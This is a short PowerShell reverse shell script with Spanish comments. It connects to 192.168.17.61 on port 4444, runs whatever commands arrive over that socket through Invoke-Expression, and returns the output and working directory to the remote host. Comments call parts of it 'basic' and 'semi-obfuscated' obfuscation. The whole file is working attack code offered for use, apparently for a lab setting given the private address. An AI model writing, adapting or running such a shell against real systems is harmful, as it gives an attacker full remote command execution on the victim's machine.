 Ejecutar esto en PowerShell visible para ver errores
$IP = "192.168.17.61"; 
$Port = 4444;
$TCPClient = New-Object Net.Sockets.TCPClient;
$Connect = $TCPClient.ConnectAsync($IP, $Port);
$Stream = $TCPClient.GetStream();
$Encoding = [Text.Encoding]::ASCII;
$Writer = New-Object IO.StreamWriter($Stream);
$Reader = New-Object IO.StreamReader($Stream);
$Writer.AutoFlush = $true;

# Ofuscación básica de comandos
$Execute = { 
    param($Command)
    try {
        $Output = (iex $Command 2>&1 | Out-String);
        $CurrentDir = (Get-Location).Path + "> ";
        $Response = $Output + $CurrentDir;
        return $Response;
    } catch { 
        return "[!] Error: $_`n" + $CurrentDir 
    }
}

# Bucle principal semi-ofuscado
while ($TCPClient.Connected) {
    try {
        $Buffer = New-Object Byte[] 4096;
        $Read = $Stream.Read($Buffer, 0, $Buffer.Length);
        if ($Read -eq 0) { break }
        $Command = $Encoding.GetString($Buffer, 0, $Read).Trim();
        $Response = &$Execute $Command;
        $Bytes = $Encoding.GetBytes($Response);
        $Stream.Write($Bytes, 0, $Bytes.Length);
    } catch { 
        Write-Host "[!] Fallo: $($_.Exception.Message)";
        break 
    }
}

$TCPClient.Close();
